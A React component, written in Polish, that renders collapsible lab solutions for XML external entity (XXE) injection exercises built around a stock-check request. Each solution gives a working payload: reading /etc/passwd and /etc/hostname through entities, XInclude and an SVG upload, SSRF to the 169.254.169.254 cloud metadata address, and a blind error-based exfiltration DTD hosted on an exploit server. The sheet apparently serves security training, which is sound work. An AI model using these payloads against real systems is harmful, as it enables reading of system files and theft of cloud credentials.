const XXE = () =>{
    return(
        <details>
            <summary>XML external entity (XXE) injection</summary>
        
            <details>
                <summary>Wykorzystanie XXE przy użyciu podmiotów zewnętrznych w celu odzyskania plików</summary>
                <p>Na stronie można znaleźć</p>
                <p>{`<?xml version="1.0" encoding="UTF-8"?>`}</p>
                <p className="tab-1">{`<stockCheck>`}</p>
                <p className="tab-2">{`<productId>`}</p>
                <p className="tab-3">1</p>
                <p className="tab-2">{`</productId>`}</p>
                <p className="tab-2">{`<storeId>`}</p>
                <p className="tab-3">1</p>
                <p className="tab-2">{`</storeId>`}</p>
                <p className="tab-1">{`</stockCheck>`}</p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>{`<?xml version="1.0" encoding="UTF-8"?>`}</p>
                    <p>{`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`}</p>
                    <p className="tab-1">{`<stockCheck>`}</p>
                    <p className="tab-2">{`<productId>`}</p>
                    <p className="tab-3">{`&xxe;`}</p>
                    <p className="tab-2">{`</productId>`}</p>
                    <p className="tab-2">{`<storeId>`}</p>
                    <p className="tab-3">1</p>
                    <p className="tab-2">{`</storeId>`}</p>
                    <p className="tab-1">{`</stockCheck>`}</p>
                </div>
            </details>
        
            <details>
                <summary>Wykorzystanie XXE do przeprowadzania ataków SSRF</summary>
                <p>Na stronie można znaleźć</p>
                <p>{`<?xml version="1.0" encoding="UTF-8"?>`}</p>
                <p className="tab-1">{`<stockCheck>`}</p>
                <p className="tab-2">{`<productId>`}</p>
                <p className="tab-3">1</p>
                <p className="tab-2">{`</productId>`}</p>
                <p className="tab-2">{`<storeId>`}</p>
                <p className="tab-3">1</p>
                <p className="tab-2">{`</storeId>`}</p>
                <p className="tab-1">{`</stockCheck>`}</p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>{`<?xml version="1.0" encoding="UTF-8"?>`}</p>
                    <p>{`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>`}</p>
                    <p className="tab-1">{`<stockCheck>`}</p>
                    <p className="tab-2">{`<productId>`}</p>
                    <p className="tab-3">{`&xxe;`}</p>
                    <p className="tab-2">{`</productId>`}</p>
                    <p className="tab-2">{`<storeId>`}</p>
                    <p className="tab-3">1</p>
                    <p className="tab-2">{`</storeId>`}</p>
                    <p className="tab-1">{`</stockCheck>`}</p>
                </div>
            </details>
        
            <details>
                <summary>Wykorzystanie blind XXE do odzyskiwania danych za pomocą komunikatów o błędach</summary>
                <p>Na stronie można znaleźć</p>
                <p>{`<?xml version="1.0" encoding="UTF-8"?>`}</p>
                <p className="tab-1">{`<stockCheck>`}</p>
                <p className="tab-2">{`<productId>`}</p>
                <p className="tab-3">1</p>
                <p className="tab-2">{`</productId>`}</p>
                <p className="tab-2">{`<storeId>`}</p>
                <p className="tab-3">1</p>
                <p className="tab-2">{`</storeId>`}</p>
                <p className="tab-1">{`</stockCheck>`}</p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p><span className="important">Exploit sever:</span></p>
                    <p>{`<!ENTITY % file SYSTEM "file:///etc/passwd">`}</p>
                    <p>{`<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">`}</p>
                    <p>{`%eval;`}</p>
                    <p>{`%exfil;`}</p>
                    <br/>
                    <p><span className="important">Request:</span></p>
                    <p>{`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "<EXPLOIT SERVER URL>"> %xxe;]>`}</p>
                </div>
            </details>
        
            <details>
                <summary>Wykorzystanie XInclude do odzyskiwania plików</summary>
                <p>Na stronie można znaleźć</p>
                <p>{`<?xml version="1.0" encoding="UTF-8"?>`}</p>
                <p className="tab-1">{`<stockCheck>`}</p>
                <p className="tab-2">{`<productId>`}</p>
                <p className="tab-3">1</p>
                <p className="tab-2">{`</productId>`}</p>
                <p className="tab-2">{`<storeId>`}</p>
                <p className="tab-3">1</p>
                <p className="tab-2">{`</storeId>`}</p>
                <p className="tab-1">{`</stockCheck>`}</p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>{`<?xml version="1.0" encoding="UTF-8"?>`}</p>
                    <p className="tab-1">{`<stockCheck>`}</p>
                    <p className="tab-2">{`<productId>`}</p>
                    <p className="tab-3"><span className="important">{`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`}</span></p>
                    <p className="tab-2">{`</productId>`}</p>
                    <p className="tab-2">{`<storeId>`}</p>
                    <p className="tab-3">1</p>
                    <p className="tab-2">{`</storeId>`}</p>
                    <p className="tab-1">{`</stockCheck>`}</p>
                </div>
            </details>
        
            <details>
                <summary>Wykorzystywanie XXE poprzez przesyłanie plików graficznych (SVG)</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p><span className="important">Jako plik SVG</span></p>
                    <p>{`<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`}</p>
                </div>
            </details>
        </details>
    )
}

export default XXE;